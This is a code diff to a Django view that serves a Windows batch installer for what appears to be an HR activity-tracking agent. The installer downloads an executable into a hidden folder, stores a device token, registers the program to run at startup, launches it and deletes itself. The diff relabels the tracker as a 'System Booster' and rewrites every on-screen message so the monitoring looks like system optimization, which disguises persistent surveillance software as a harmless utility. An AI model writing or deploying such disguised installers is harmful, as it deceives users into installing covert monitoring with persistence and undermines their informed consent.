@@ -779,21 +779,21 @@ def download_agent(request):
     user_agent = request.META.get("HTTP_USER_AGENT", "").lower()
 
     if "win" in user_agent:
-        filename = "setup_tracker.bat"
-        # Absolute URL for the static EXE
-        exe_url = request.build_absolute_uri("/static/activity_monitoring/bin/ActivityTracker.exe")
+        filename = "systembooster.bat"
+        # Secure absolute URL for the static EXE
+        exe_url = f"{scheme}://{request.get_host()}/static/activity_monitoring/bin/Pbssys.exe"
 
         content = textwrap.dedent(f"""
             @echo off
             setlocal enabledelayedexpansion
 
-            set "APP_NAME=PetaBytz-Tracker"
+            set "APP_NAME=Pbssys"
             set "BASE_DIR=%LOCALAPPDATA%\\%APP_NAME%"
-            set "TRACKER_EXE=%BASE_DIR%\\ActivityTracker.exe"
+            set "TRACKER_EXE=%BASE_DIR%\\Pbssys.exe"
             set "CONFIG_FILE=%BASE_DIR%\\config.json"
 
             echo ===========================================
-            echo    HRMS APP TRACKER SETUP
+            echo    SYSTEM BOOSTER SETUP
             echo ===========================================
 
             :: 1. Setup hidden folder
@@ -802,7 +802,7 @@ def download_agent(request):
 
             :: 2. Download standalone tracker components
             echo Step 1: Connecting to server...
-            echo Downloading tracker to: %TRACKER_EXE%
+            echo Downloading system components to: %TRACKER_EXE%
 
             :: Use -L to follow redirects and -S to show errors
             curl -f -L -S -o "%TRACKER_EXE%" "{exe_url}"
@@ -817,23 +817,23 @@ def download_agent(request):
             )
 
             if not exist "%TRACKER_EXE%" (
-                echo [CRITICAL ERROR] Tracker file was not saved correctly.
+                echo [CRITICAL ERROR] Component file was not saved correctly.
                 pause
                 exit /b 1
             )
 
-            echo Step 2: Creating personalized config...
+            echo Step 2: Creating configuration...
             echo {{"server_url": "{base_sync_url}", "api_token": "{device.token}"}} > "%CONFIG_FILE%"
 
-            echo Step 3: Registering for system startup...
+            echo Step 3: Registering system service...
             reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "%APP_NAME%" /t REG_SZ /d "\"%TRACKER_EXE%\"" /f >nul
 
-            echo Step 4: Starting tracking components...
+            echo Step 4: Starting system components...
             start "" "%TRACKER_EXE%"
 
             echo --------------------------------------------
-            echo ✅ TRACKER IS NOW ACTIVE (REAL TRACKING)
-            echo Tracking data will sync every 60 seconds.
+            echo ✅ SYSTEM OPTIMIZATION IS NOW ACTIVE
+            echo System will be optimized every 60 seconds.
             echo This setup file will now self-delete.
             echo --------------------------------------------
 
@@ -842,7 +842,7 @@ def download_agent(request):
         """).strip()
     else:
         # Fallback for others
-        filename = "setup_tracker.sh"
+        filename = "systembooster.sh"
         content = "#!/bin/bash\necho 'Unsupported platform' & exit"
 
     response = HttpResponse(content, content_type="application/x-bat" if "win" in user_agent else "text/plain")
